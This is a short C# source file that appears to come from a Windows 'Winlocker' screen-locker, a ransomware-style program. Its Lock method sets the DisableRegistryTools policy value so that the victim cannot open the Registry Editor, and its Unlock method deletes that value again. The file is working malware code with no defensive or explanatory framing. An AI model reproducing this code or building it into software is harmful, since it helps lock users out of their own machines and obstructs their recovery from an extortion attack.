using Microsoft.Win32;

namespace Winlocker.Models
{
    public class Registry
    {
        public static void Lock()
        {
            RegistryKey reg;
            string key = "1";
            string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(sub);
            reg.SetValue("DisableRegistryTools", key, RegistryValueKind.DWord);
            reg.Close();
        }

        public static void Unlock()
        {
            RegistryKey reg;
            string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(sub, true);
            reg.DeleteValue("DisableRegistryTools");
            reg.Close();
        }
    }
}
